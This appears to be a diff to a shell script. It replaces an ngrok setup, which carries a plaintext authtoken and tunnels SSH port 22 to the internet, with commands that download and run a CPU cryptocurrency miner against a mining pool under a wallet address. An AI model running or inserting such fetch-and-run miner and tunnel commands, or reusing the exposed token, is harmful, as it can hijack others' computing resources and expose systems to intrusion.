@@ -1,7 +1,3 @@
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
-
-unzip ngrok-stable-linux-amd64.zip
-
-./ngrok authtoken 1kggPYGUrv9FyzYawQq1nguifgO_2scWy9f72bAQriN79H1mG
-
-./ngrok tcp 22
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar -xvf hellminer_cpu_linux.tar.gz
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RDjP6v7mSbBMhs1CFfzdHvJQftVpFTm3Fe.blazing -p hybrid --cpu 16
